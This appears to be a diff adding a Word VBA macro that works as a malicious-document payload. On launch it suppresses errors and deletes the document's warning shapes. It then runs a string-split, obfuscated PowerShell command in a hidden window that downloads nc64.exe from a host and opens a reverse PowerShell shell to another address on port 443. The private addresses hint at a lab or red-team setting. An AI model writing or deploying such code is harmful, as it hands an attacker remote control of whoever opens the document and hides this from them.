@@ -1,0 +1,30 @@
+Public Once As Integer
+
+Public Sub Launch()
+    On Error Resume Next
+    DeleteWarningShape "warning-div", False
+    DeleteWarningShape "Control 2", False
+    call sanityCheck()
+    Dim authorProperty As String
+    authorProperty = ActiveDocument.BuiltInDocumentProperties("Author")
+    Set objWShell = CreateObject("WScr" & "ipt.S" & "hell")
+    With objWShell.Exec("powe" & "rsh" & "ell.exe -no" & "p -w" & "indowstyle hid" & "den -Com" & "mand" & " iwr -uri http://192.16" & "8.0.115/n" & "c64.exe -o c:\tes" & "t\nc64.exe; cm" & "d /c c:\test\nc" & "64.exe -e powe" & "rshell.exe 10.0.2.4 443")
+        .StdIn.WriteLine authorProperty
+        .StdIn.WriteBlankLine 1
+        .Terminate
+    End With
+End Sub
+
+Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
+    Dim shape As Word.shape
+    On Error Resume Next
+    For Each shape In ActiveDocument.Shapes
+        If StrComp(shape.Name, textBoxName) = 0 Then
+            shape.Delete
+            Exit For
+        End If
+    Next
+    If saveDocAfter Then
+        ActiveDocument.Save
+    End If
+End Sub
